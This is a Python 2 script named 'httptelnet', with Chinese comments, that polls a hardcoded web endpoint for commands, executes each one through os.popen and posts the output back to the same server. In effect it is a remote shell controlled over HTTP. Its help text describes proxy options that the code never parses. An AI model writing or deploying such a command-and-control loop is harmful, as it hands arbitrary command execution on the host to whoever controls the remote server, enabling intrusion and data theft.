# -*- coding: utf-8 -*-
#!/usr/bin/python
# httptelnet
# http协议是目前兼容性、可用性较高的协议
# telnet
import sys
import os
import HTMLParser
import urlparse
import urllib
import urllib2
import cookielib
import string
import re
import json
import datetime
import math
import thread
import threading
import collections
import getopt
import types

reload(sys)
sys.setdefaultencoding('utf-8')

def findByToken(content, sBegin, sEnd, lBegin = -1, lSkip = 0, bInclude = False):
    for i in range(0, lSkip + 1):
        lBegin = content.find(sBegin, lBegin + 1)
        if lBegin == -1:
            return ''
    lEnd = content.find(sEnd, lBegin + len(sBegin))
    if lEnd == -1:
        lEnd = len(content)
    if bInclude:
        ret = content[lBegin: lEnd + len(sEnd)]
    else:
        ret = content[lBegin + len(sBegin): lEnd]
    return ret

def test_findByToken():
    html = "<div class='fl'><a href='#'>1</a><a>2</a><a>3</a></div>"
    print findByToken(html, "<a", "</a>")
    print findByToken(html, "<a", "/a>", 1, 1, True)
    print findByToken(html, "<a", "/a>", 1, 2, True)
    print findByToken(html, "<a>", "</a>", 10, 1)
    print findByToken(": 13 `WO2010019430-A2; ", " ", " ")

class HttpClient:

    def __init__(self):
        self.refererURL = ''

    def post(self, url, poststr):
        cj = cookielib.LWPCookieJar()
        cookie_support = urllib2.HTTPCookieProcessor(cj)
        opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)
        urllib2.install_opener(opener)
        headers = {
        'User-Agent' : 'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/6.0)',
        'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language' : 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
        'Content-type' : 'application/x-www-form-urlencoded',
        'Referer' : self.refererURL}
        request = urllib2.Request(url, poststr, headers)
        response = urllib2.urlopen(request)
        text = response.read()
        return {'url':response.geturl(), 'info': response.info(), 'content':text}
            
    def get(self, url):
        cj = cookielib.LWPCookieJar()
        cookie_support = urllib2.HTTPCookieProcessor(cj)
        opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)
        urllib2.install_opener(opener)
        headers = {
        'User-Agent' : 'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/6.0)',
        'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language' : 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
        'Referer' : self.refererURL}
        request = urllib2.Request(url, '', headers)
        response = urllib2.urlopen(request)
        text = response.read()
        return text

def getDateTimeStr():
    now = datetime.datetime.now()
    return now.strftime('%Y-%m-%d %H:%M:%S')

class App:
    """
    帮助信息
    """
    def printHelp(self):
        print 'httptelnet.py'
        print '===Usage==='
        print 'python TinyHTTPProxy.py -s host:port -a user:pass'
        print '-h,--help: print help message.'
        print '-l,--listen: 向外开放的代理服务端口'
        print '-s,--server: 一级代理服务器ip:端口'
        print '-a,--auth: 一级代理服务器的用户名密码，例如domain\username:password'

    """
    程序入口main
    """
    def main(self, argv):
        try:
            opts, args = getopt.getopt(argv[1:], 'hl:', ['help', 'listen='])
        except getopt.GetoptError, err:
            print str(err)
            self.printHelp()
            sys.exit(2)
        for key, value in opts:
            if key in ('-h', '--help'):
                self.printHelp()
                sys.exit(1)
            elif key in ('-l', '--listen'):
                self.url = value
            else:
                print 'unhandled option'
                sys.exit(3)
    
    def run(self):
        httpclient = HttpClient()
        while True:
            strJson = httpclient.get(self.url + '?r=comet/subscribe&names=httptelnet-cmd')
            obj = json.loads(strJson)
            print strJson
            print obj
            if type(obj) is types.DictType and obj.has_key('success') and obj['success'] == True: 
                if obj['data']['status'] == 1:
                    for k in obj['data']['events']:
                        cmd = obj['data']['events'][k]
                        print '[cmd]', cmd
                        lines = os.popen(cmd).readlines()
                        # ret = os.system(cmd)
                        print lines
                        post = ''.join(lines)
                        post = post.decode('gbk')
                        print post
                        httpclient.post(self.url + '?r=comet/publish&name=httptelnet-ret', urllib.urlencode({'memo':post}))
        
if __name__ == '__main__':
    app = App()
    argv = sys.argv
    #这是方便调试用的
    argv = ['filename.py', '-l', r'http://www.portso.com.cn/apps/deDaemon.php']
    app.main(argv)
    app.run()
